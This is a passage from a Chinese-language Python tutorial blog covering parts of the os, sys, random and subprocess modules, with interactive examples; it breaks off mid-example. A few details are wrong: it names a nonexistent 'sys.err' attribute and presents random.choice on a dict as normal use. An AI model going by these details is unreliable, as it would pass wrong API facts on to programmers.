<em>dst_dir_fd=None</em>)</td><td>将文件或目录 <em>src</em> 重命名为 <em>dst</em>。如果 <em>dst</em> 已存在，则下列情况下将会操作失败，并抛出 <a href="https://docs.python.org/zh-cn/3.7/library/exceptions.html#OSError" target="_blank" rel="noopener"><code>OSError</code></a> 的子类</td></tr><tr><td><code>rmdir</code>(<em>path</em>, *, <em>dir_fd=None</em>)</td><td>移除（删除）目录 <em>path</em>。如果目录不存在或不为空，则会分别抛出 <a href="https://docs.python.org/zh-cn/3.7/library/exceptions.html#FileNotFoundError" target="_blank" rel="noopener"><code>FileNotFoundError</code></a> 或 <a href="https://docs.python.org/zh-cn/3.7/library/exceptions.html#OSError" target="_blank" rel="noopener"><code>OSError</code></a> 异常。</td></tr></tbody></table></div><h3 id="0x09-sys-模块"><a href="#0x09-sys-模块" class="headerlink" title="0x09 sys 模块"></a>0x09 sys 模块</h3><blockquote><p>本部分参考了<a href="http://www.ityouknow.com/python/2019/10/09/python-sys-demonstration-028.html" target="_blank" rel="noopener">第28天：Python 标准库之 sys 模块详解</a></p></blockquote><p><code>与OS的区别</code><a href="https://www.zhihu.com/question/31843617" target="_blank" rel="noopener">https://www.zhihu.com/question/31843617</a></p><blockquote><p>os与sys模块的官方解释如下： </p><ul><li>os: This module provides a portable way of using operating system dependent functionality. 这个模块提供了一种方便的使用操作系统函数的方法。 </li><li>sys: This module provides access to some variables used or maintained by the interpreter and to functions that interact strongly with the interpreter. 这个模块可供访问由解释器使用或维护的变量和与解释器进行交互的函数。</li></ul><p><code>总结</code>：<br>os模块负责<strong>程序与操作系统</strong>的交互，提供了访问<strong>操作系统底层的接口</strong>;sys模块<strong>负责程序与python解释器</strong>的交互，提供了一系列的函数和变量，用于操控python的运行时环境。</p><ul><li><p>os就是一个普通的python库，用来向Python程序提供运行环境，特别是在文件系统、创建新进程、获取操作系统本身的一些信息（比如uname)，并屏蔽各种不同操作系统之间的细节差异。</p></li><li><p>sys模块则是python程序用来请求解释器行为的接口。比如关于调试类的（trace, frames，except）等，profiling类（stats， getsizeof)，运行时环境类（python path, stderr, stdout)，解释器本身（如version）。inspect某种程度上可以看成是在sys提供的功能上的一个包装。</p></li></ul><p>一个python程序可以不用到os，但无法避免sys的介入（尽管你可能并不import它）。</p></blockquote><h4 id="1-sys-argv"><a href="#1-sys-argv" class="headerlink" title="1.sys.argv"></a>1.sys.argv</h4><blockquote><p>argv”即“argument value”的简写，是一个列表对象，其中存储的是在命令行调用 Python 脚本时提供的“命令行参数”。这个列表中的第一个参数是被调用的脚本名称，也就是说，调用 Python 解释器的“命令”（<code>python</code>）本身并没有被加入这个列表当中。这个地方要注意一下，因为这一点跟 C 程序的行为有所不同，C 程序读取命令行参数是从头开始的。</p></blockquote><p>举例来说，在当前目录下新建一个 Python 文件<code>sys_argv_example.py</code>，其内容为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">print(<span class="string">"The list of command line arguments:\n"</span>, sys.argv)</span><br></pre></td></tr></table></figure><p>在命令行运行该脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python sys_argv_example.py</span><br><span class="line">The list of command line arguments:</span><br><span class="line"> [<span class="string">'example.py'</span>]</span><br></pre></td></tr></table></figure><p>加上几个参数试试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python sys_argv_example.py arg1 arg2 arg3</span><br><span class="line">The list of command line arguments:</span><br><span class="line"> [<span class="string">'example.py'</span>, <span class="string">'arg1'</span>, <span class="string">'arg2'</span>, <span class="string">'arg3'</span>]</span><br></pre></td></tr></table></figure><p>利用好这个属性，可以极大增强 Python 脚本的交互性。</p><h4 id="2-sys-platform"><a href="#2-sys-platform" class="headerlink" title="2.sys.platform"></a>2.sys.platform</h4><p>查看<code>sys</code>模块中的<code>sys.platform</code>属性可以得到关于运行平台更详细的信息”，这里我们就来试试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.platform</span><br><span class="line"><span class="string">'win32'</span></span><br></pre></td></tr></table></figure><p>在 Linux 上：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.platform</span><br><span class="line"><span class="string">'linux'</span></span><br></pre></td></tr></table></figure><p>比较一下<code>os.name</code>的结果，不难发现，<code>sys.platform</code>的信息更加准确。</p><h4 id="3-sys-byteorder"><a href="#3-sys-byteorder" class="headerlink" title="3.sys.byteorder"></a>3.sys.byteorder</h4><p>“byteorder”即“字节序”，指的是在计算机内部存储数据时，数据的低位字节存储在存储空间中的高位还是低位。</p><p>“小端存储”时，数据的低位也存储在存储空间的低位地址中，此时<code>sys.byteorder</code>的值为<code>“little”</code>。如果不注意，在按地址顺序打印内容的时候，可能会把小端存储的内容打错。当前<strong>大部分机器</strong>都是使用的小端存储。</p><p>所以不出意外的话，你的机器上执行下述交互语句也应当跟我的结果一样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.byteorder</span><br><span class="line"><span class="string">'little'</span></span><br></pre></td></tr></table></figure><p>而另外还存在一种存储顺序是“大端存储”，即数据的高位字节存储在存储空间的低位地址上，此时<code>sys.byteorder</code>的值为<code>“big”</code>。</p><p>这种方式看起来好像很合理也很自然，因为我们一般在书面表示的时候都将低位地址写在左边，高位地址写在右边，大端存储的顺序就很符合人类的阅读习惯。但实际上对机器而言，内存地址并没有左右之分，所谓的“自然”其实并不存在。</p><p>抱歉我并没有使用大端存储的机器可以用作演示，因此只能说如果是大端存储的机器上运行 Python，输出结果应该像下面这样，也就是说下面这个示例并非我得到的真实运行结果，仅供参考：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.byteorder</span><br><span class="line"><span class="string">'big'</span></span><br></pre></td></tr></table></figure><h4 id="4-sys-executable"><a href="#4-sys-executable" class="headerlink" title="4.sys.executable"></a>4.sys.executable</h4><p>该属性是一个字符串，在正常情况下，其值是当前运行的 Python 解释器对应的可执行程序所在的绝对路径。</p><p>比如在 Windows 上使用 Anaconda 安装的 Python，该属性的值就是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.executable</span><br><span class="line"><span class="string">'E:\\Anaconda\\Anaconda\\python.exe'</span></span><br></pre></td></tr></table></figure><h4 id="5-sys-modules"><a href="#5-sys-modules" class="headerlink" title="5.sys.modules"></a>5.sys.modules</h4><p>该属性是一个字典，包含的是各种已加载的模块的模块名到模块具体位置的映射。</p><p>通过手动修改这个字典，可以重新加载某些模块；但要注意，切记不要大意删除了一些基本的项，否则可能会导致 Python 整个儿无法运行。关于其具体的值，由于内容过多，就不在此给出示例了，</p><h4 id="6-sys-builtin-module-names"><a href="#6-sys-builtin-module-names" class="headerlink" title="6.sys.builtin_module_names"></a>6.sys.builtin_module_names</h4><p>该属性是一个字符串元组，其中的元素均为当前所使用的的 Python 解释器内置的模块名称。</p><p>注意区别<code>sys.modules</code>和<code>sys.builtin_module_names</code>——前者的关键字（keys）列出的是导入的模块名，而后者则是解释器内置的模块名。</p><p>其值示例如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sys.builtin_module_names</span><br><span class="line">(&apos;_abc&apos;, &apos;_ast&apos;, &apos;_bisect&apos;, &apos;_blake2&apos;, &apos;_codecs&apos;, &apos;_codecs_cn&apos;, &apos;_codecs_hk&apos;, &apos;_codecs_iso2022&apos;, &apos;_codecs_jp&apos;, &apos;_codecs_kr&apos;, &apos;_codecs_tw&apos;, &apos;_collections&apos;, &apos;_contextvars&apos;, &apos;_csv&apos;, &apos;_datetime&apos;, &apos;_functools&apos;, &apos;_heapq&apos;, &apos;_imp&apos;, &apos;_io&apos;, &apos;_json&apos;, &apos;_locale&apos;, &apos;_lsprof&apos;, &apos;_md5&apos;, &apos;_multibytecodec&apos;, &apos;_opcode&apos;, &apos;_operator&apos;, &apos;_pickle&apos;, &apos;_random&apos;, &apos;_sha1&apos;, &apos;_sha256&apos;, &apos;_sha3&apos;, &apos;_sha512&apos;, &apos;_signal&apos;, &apos;_sre&apos;, &apos;_stat&apos;, &apos;_string&apos;, &apos;_struct&apos;, &apos;_symtable&apos;, &apos;_thread&apos;, &apos;_tracemalloc&apos;, &apos;_warnings&apos;, &apos;_weakref&apos;, &apos;_winapi&apos;, &apos;array&apos;, &apos;atexit&apos;, &apos;audioop&apos;, &apos;binascii&apos;, &apos;builtins&apos;, &apos;cmath&apos;, &apos;errno&apos;, &apos;faulthandler&apos;, &apos;gc&apos;, &apos;itertools&apos;, &apos;marshal&apos;, &apos;math&apos;, &apos;mmap&apos;, &apos;msvcrt&apos;, &apos;nt&apos;, &apos;parser&apos;, &apos;sys&apos;, &apos;time&apos;, &apos;winreg&apos;, &apos;xxsubtype&apos;, &apos;zipimport&apos;, &apos;zlib&apos;)</span><br></pre></td></tr></table></figure><h4 id="7-sys-path"><a href="#7-sys-path" class="headerlink" title="7.sys.path"></a>7.sys.path</h4><p>A list of strings that specifies the search path for modules. Initialized from the environment variable <a href="https://docs.python.org/3/using/cmdline.html#envvar-PYTHONPATH" target="_blank" rel="noopener"><code>PYTHONPATH</code></a>, plus an installation-dependent default.</p><p>该属性是一个由字符串组成的列表，其中各个元素表示的是 Python 搜索模块的路径；在程序启动期间被初始化。</p><p>其中第一个元素（也就是<code>path[0]</code>）的值是最初调用 Python 解释器的脚本所在的绝对路径；如果是在交互式环境下查看<code>sys.path</code>的值，就会得到一个空字符串。</p><p>命令行运行脚本（脚本代码见示例 <code>sys_path_example.py</code>）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python sys_path_example.py</span><br><span class="line">The path[0] =  D:\justdopython\sys_example</span><br></pre></td></tr></table></figure><p>交互式环境查看属性第一个元素：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sys.path[0]</span><br><span class="line">&apos;&apos;</span><br></pre></td></tr></table></figure><h4 id="8-sys-stdin"><a href="#8-sys-stdin" class="headerlink" title="8.sys.stdin"></a>8.sys.stdin</h4><p>即 Python 的标准输入通道。通过改变这个属性为其他的类文件（file-like）对象，可以实现输入的重定向，也就是说可以用其他内容替换标准输入的内容。</p><p>所谓“标准输入”，实际上就是通过键盘输入的字符。</p><p>在示例（<code>sys_stdin_example.py</code>）中，我们尝试把这个属性的值改为一个打开的文件对象<code>hello_python.txt</code>，其中包含如下的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Hello Python!</span><br><span class="line">Just do Python, go~</span><br><span class="line"></span><br><span class="line">Go, Go, GO!</span><br></pre></td></tr></table></figure><p>由于<code>input()</code>使用的就是标准输入流，因此通过修改<code>sys.stdin</code>的值，我们使用老朋友<code>input()</code>函数，也可以实现对文件内容的读取，程序运行效果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python sys_stdin_example.py</span><br><span class="line">Hello Python!</span><br><span class="line">Just do Python, go~</span><br><span class="line"></span><br><span class="line">Go, Go, GO!</span><br></pre></td></tr></table></figure><h4 id="9-sys-stdout"><a href="#9-sys-stdout" class="headerlink" title="9.sys.stdout"></a>9.sys.stdout</h4><p>与上一个“标准输入”类似，<code>sys.stdout</code>则是代表“标准输出”的属性。</p><p>通过将这个属性的值修改为某个文件对象，可以将本来要打印到屏幕上的内容写入文件。</p><p>比如运行示例程序<code>sys_stdout_example.py</code>，用来临时生成日志也是十分方便的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 以附加模式打开文件，若不存在则新建</span><br><span class="line">with open(&quot;count_log.txt&quot;, &apos;a&apos;, encoding=&apos;utf-8&apos;) as f:</span><br><span class="line">    sys.stdout = f</span><br><span class="line">    for i in range(10):</span><br><span class="line">        print(&quot;count = &quot;, i)</span><br></pre></td></tr></table></figure><p><code>从控制台重定向到文件</code></p><blockquote><p>stdout 和 print 可以结合使用的案例。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">file = sys.stdout    <span class="comment"># 存储原始的输出对象</span></span><br><span class="line">sys.stdout = open(<span class="string">'1.txt'</span>, <span class="string">'w'</span>)  <span class="comment"># 重定向所有的写入内容到 1.txt 文件</span></span><br><span class="line">print(<span class="string">'Citizen_Wang'</span>)   <span class="comment"># 写入到 1.txt 文件中</span></span><br><span class="line">print(<span class="string">'Always fall in love with neighbours'</span>)  <span class="comment"># 继续写入到文件中</span></span><br><span class="line">sys.stdout.close()    <span class="comment"># 其实就是 open 文件之后的关闭</span></span><br><span class="line">sys.stdout = file  <span class="comment"># 将 print 命令的结果返回给控制台</span></span><br><span class="line">print(<span class="string">'输出信息返回在控制台'</span>)  <span class="comment"># 该信息会在控制台也显示12345678</span></span><br></pre></td></tr></table></figure><p>在当前目录下创建了一个 1.txt 文件，内容如下：</p><blockquote><p>Citizen_Wang<br>Always fall in love with neighbours</p></blockquote><h4 id="9-sys-stdout-write"><a href="#9-sys-stdout-write" class="headerlink" title="9+.sys.stdout.write"></a>9+.sys.stdout.write</h4><blockquote><p>这个方法，调用的就是 file 对象的 write 方法，区别是 file 对象的 write 方法吧字符写入到文件中，sys.stdout.write 方法把字符写入到标准输出中，也就是控制台。</p><ul><li>print 几乎可以打印所有的对象，而 stdout.write 只能接受 str 类型。</li><li>stdout.write 默认不换行，print 默认换行</li></ul></blockquote><h4 id="10-sys-err"><a href="#10-sys-err" class="headerlink" title="10.sys.err"></a>10.sys.err</h4><p>与前面两个属性类似，只不过该属性标识的是标准错误，通常也是定向到屏幕的，可以粗糙地认为是一个输出错误信息的特殊的标准输出流。由于性质类似，因此不做演示。</p><p>此外，<code>sys</code>模块中还存在几个“私有”属性：<code>sys.__stdin__</code>，<code>sys.__stdout__</code>，<code>sys.__stderr__</code>。这几个属性中保存的就是最初定向的“标准输入”、“标准输出”和“标准错误”流。在适当的时侯，我们可以借助这三个属性将<code>sys.stdin</code>、<code>sys.stdout</code>和<code>sys.err</code>恢复为初始值。</p><h4 id="11-sys-getrecursionlimit-和-sys-setrecursionlimit"><a href="#11-sys-getrecursionlimit-和-sys-setrecursionlimit" class="headerlink" title="11.sys.getrecursionlimit() 和 sys.setrecursionlimit()"></a>11.sys.getrecursionlimit() 和 sys.setrecursionlimit()</h4><p><code>sys.getrecursionlimit()</code>和<code>sys.setrecursionlimit()</code>是成对的。前者可以获取 Python 的最大递归数目，后者则可以设置最大递归数目。因为初学阶段很少用到，因此只做了解。</p><h4 id="12-sys-getrefcount"><a href="#12-sys-getrefcount" class="headerlink" title="12.sys.getrefcount()"></a>12.sys.getrefcount()</h4><p>在《<a href="http://www.justdopython.com/2019/09/12/python-reference-012" target="_blank" rel="noopener">第12天：Python 之引用</a>》中我们其实已经用到过这个函数，其返回值是 Python 中某个对象被引用的次数。关于“引用”的知识可以回去看看这篇文章。</p><h4 id="13-sys-getsizeof"><a href="#13-sys-getsizeof" class="headerlink" title="13.sys.getsizeof()"></a>13.sys.getsizeof()</h4><p>这个函数的作用与 C 语言中的<code>sizeof</code>运算符类似，返回的是作用对象所占用的字节数。</p><p>比如我们就可以看看一个整型对象<code>1</code>在内存中的大小：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.getsizeof(<span class="number">1</span>)</span><br><span class="line"><span class="number">28</span></span><br></pre></td></tr></table></figure><p>注意，在 Python 中，某类对象的大小并非一成不变的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.getsizeof(<span class="number">2</span>**<span class="number">30</span><span class="number">-1</span>)</span><br><span class="line"><span class="number">28</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.getsizeof(<span class="number">2</span>**<span class="number">30</span>)</span><br><span class="line"><span class="number">32</span></span><br></pre></td></tr></table></figure><h4 id="14-sys-int-info-和-sys-float-info"><a href="#14-sys-int-info-和-sys-float-info" class="headerlink" title="14.sys.int_info 和 sys.float_info"></a>14.sys.int_info 和 sys.float_info</h4><p>这两个属性分别给出了 Python 中两个重要的数据类型的相关信息。</p><p>其中<code>sys.int_info</code>的值为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sys.int_info</span><br><span class="line">sys.int_info(bits_per_digit=30, sizeof_digit=4)</span><br></pre></td></tr></table></figure><p>在文档中的解释为：</p><div class="table-container"><table><thead><tr><th style="text-align:center">属性</th><th style="text-align:center">解释</th></tr></thead><tbody><tr><td style="text-align:center">bits_per_digit</td><td style="text-align:center">number of bits held in each digit. Python integers are stored internally in base <code>2**int_info.bits_per_digit</code></td></tr><tr><td style="text-align:center">sizeof_digit</td><td style="text-align:center">size in bytes of the C type used to represent a digit</td></tr></tbody></table></div><p>指的是 Python 以 2 的<code>sys.int_info.bits_per_digit</code>次方为基来表示整数，也就是说它是“2 的<code>sys.int_info.bits_per_digit</code>次方进制”的数。这样的数每一个为都用 C 类中的 4 个字节来存储。</p><p>换句话说，每“进 1 位”（即整数值增加2 的<code>sys.int_info.bits_per_digit</code>次方），就需要多分配 4 个字节用以保存某个整数。</p><p>因此在<code>sys.getsizeof()</code>的示例中，我们可以看到<code>2**30-1</code>和<code>2**30</code>之间，虽然本身只差了 1，但是所占的字节后者却比前者多了 4。</p><p>而<code>sys.float_info</code>的值则是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sys.float_info</span><br><span class="line">sys.float_info(max=1.7976931348623157e+308, max_exp=1024, max_10_exp=308, min=2.2250738585072014e-308, min_exp=-1021, min_10_exp=-307, dig=15, mant_dig=53, epsilon=2.220446049250313e-16, radix=2, rounds=1)</span><br></pre></td></tr></table></figure><p>其中各项具体的含义就不在这里继续展开了，感兴趣的同学可以参看<a href="https://docs.python.org/3/library/sys.html?highlight=sys.float_info#sys.float_info" target="_blank" rel="noopener">文档</a>和<a href="https://book.douban.com/subject/26912767/" target="_blank" rel="noopener">《深入理解计算机系统》</a>等讲解组成原理的书。</p><h3 id="0x0A-random-模块"><a href="#0x0A-random-模块" class="headerlink" title="0x0A random 模块"></a>0x0A random 模块</h3><h4 id="1-random-randint-start-end-方法"><a href="#1-random-randint-start-end-方法" class="headerlink" title="1.random.randint(start, end) 方法"></a>1.random.randint(start, end) 方法</h4><blockquote><p>产生 start 到 end 的一个整数型随机数 </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> random</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.randint(<span class="number">1</span>,<span class="number">100</span>)</span><br><span class="line"><span class="number">34</span></span><br></pre></td></tr></table></figure><h4 id="2-random-random-方法"><a href="#2-random-random-方法" class="headerlink" title="2.random.random() 方法"></a>2.random.random() 方法</h4><blockquote><p>产生 0 到 1 之间的随机浮点数</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> random</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.random()</span><br><span class="line"><span class="number">0.931770155505083</span></span><br></pre></td></tr></table></figure><h4 id="3-random-uniform-start-end-方法"><a href="#3-random-uniform-start-end-方法" class="headerlink" title="3.random.uniform(start, end) 方法"></a>3.random.uniform(start, end) 方法</h4><blockquote><p>产生  1.1 到 5.4 之间的随机浮点数，区间可以不是整数</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> random</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.uniform(<span class="number">1.1</span>,<span class="number">5.4</span>)</span><br><span class="line"><span class="number">2.387412380799667</span></span><br></pre></td></tr></table></figure><h4 id="4-random-choice-序列-方法"><a href="#4-random-choice-序列-方法" class="headerlink" title="4.random.choice(序列) 方法"></a>4.random.choice(序列) 方法</h4><blockquote><p>从序列（字符串、列表、字典等）中随机选取一个元素</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> random</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.choice(<span class="string">'tomorrow'</span>)</span><br><span class="line"><span class="string">'o'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.choice(<span class="string">'tomorrow'</span>)</span><br><span class="line"><span class="string">'r'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.choice([<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>])</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.choice([<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>])</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.choice(&#123;<span class="number">1</span>:<span class="number">3</span>,<span class="number">4</span>:<span class="number">5</span>&#125;)</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><h4 id="5-random-randrange-start-end-step-方法"><a href="#5-random-randrange-start-end-step-方法" class="headerlink" title="5.random.randrange(start,end,step) 方法"></a>5.random.randrange(start,end,step) 方法</h4><blockquote><p>生成从start到end的间隔为step的随机整数</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> random</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.randrange(<span class="number">1</span>,<span class="number">100</span>,<span class="number">2</span>)</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.randrange(<span class="number">1</span>,<span class="number">100</span>,<span class="number">2</span>)</span><br><span class="line"><span class="number">9</span></span><br></pre></td></tr></table></figure><h4 id="6-random-shuffle-items-方法"><a href="#6-random-shuffle-items-方法" class="headerlink" title="6.random.shuffle(items) 方法"></a>6.random.shuffle(items) 方法</h4><blockquote><p>将序列 items 中的元素顺序打乱</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=[<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>]                <span class="comment"># 将序列a中的元素顺序打乱</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.shuffle(a)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(a)</span><br><span class="line">[<span class="number">7</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br></pre></td></tr></table></figure><h3 id="0x0B-subprocess-模块"><a href="#0x0B-subprocess-模块" class="headerlink" title="0x0B subprocess 模块"></a>0x0B subprocess 模块</h3><blockquote><p>参考文章</p><ul><li><a href="https://www.pynote.net/archives/490" target="_blank" rel="noopener">subprocess模块教程</a></li><li><a href="https://zhuanlan.zhihu.com/p/72829009" target="_blank" rel="noopener">Python 调用系统命令的模块 Subprocess</a></li></ul></blockquote><h4 id="1-subprocess-run"><a href="#1-subprocess-run" class="headerlink" title="1.subprocess.run()"></a>1.subprocess.run()</h4><blockquote><p>从Python3.5开始，出现了run函数，用来代替之前版本的一些函数接口。run函数的作用是：执行args参数所表示的命令，等待命令执行完毕，返回一个CompletedProcess对象。<strong>注意，run函数是同步函数，要等待！</strong></p></blockquote><p><code>语句格式</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">subprocess.run(args, *, stdin=<span class="keyword">None</span>, input=<span class="keyword">None</span>, stdout=<span class="keyword">None</span>, stderr=<span class="keyword">None</span>, </span><br><span class="line">capture_output=<span class="keyword">False</span>, shell=<span class="keyword">False</span>, cwd=<span class="keyword">None</span>, timeout=<span class="keyword">None</span>, </span><br><span class="line">check=<span class="keyword">False</span>, encoding=<span class="keyword">None</span>, errors=<span class="keyword">None</span>, text=<span class="keyword">None</span>, env=<span class="keyword">None</span>,</span><br><span class="line">universal_newlines=<span class="keyword">None</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>args参数</strong>，就是要通过创建进程而执行的命令及参数，run函数通过args来创建一个进程并执行</li><li><strong>shell参数</strong>，表示是否通过shell来执行命令（Linux下默认为/bin/sh），默认是<strong>False</strong>，这时args只能是一个不带参数的命令字符串，或者是命令和参数组成的一个list，如果shell=True，args就可以是一个我们常见的命令字符串。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>proc = run(<span class="string">'ls -l'</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">"/usr/lib/python3.6/subprocess.py"</span>, line <span class="number">423</span>, <span class="keyword">in</span> run</span><br><span class="line">    <span class="keyword">with</span> Popen(*popenargs, **kwargs) <span class="keyword">as</span> process:</span><br><span class="line">  File <span class="string">"/usr/lib/python3.6/subprocess.py"</span>, line <span class="number">729</span>, <span class="keyword">in</span> __init__</span><br><span class="line">    restore_signals, start_new_session)</span><br><span class="line">  File <span class="string">"/usr/lib/python3.6/subprocess.py"</span>, line <span class="number">1364</span>, <span class="keyword">in</span> _execute_child</span><br><span class="line">    <span class="keyword">raise</span> child_exception_type(errno_num, err_msg, err_filename)</span><br><span class="line">FileNotFoundError: [Errno <span class="number">2</span>] No such file <span class="keyword">or</span> directory: <span class="string">'ls -l'</span>: <span class="string">'ls -l'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proc = run(<span class="string">'ls -l'</span>,shell=<span class="keyword">True</span>)</span><br><span class="line">total <span class="number">79724</span></span><br><span class="line">drwxr-xr-x <span class="number">3</span> root root     <span class="number">4096</span> Sep <span class="number">22</span> <span class="number">19</span>:<span class="number">18</span> bento4</span><br><span class="line">...</span><br><span class="line"><span 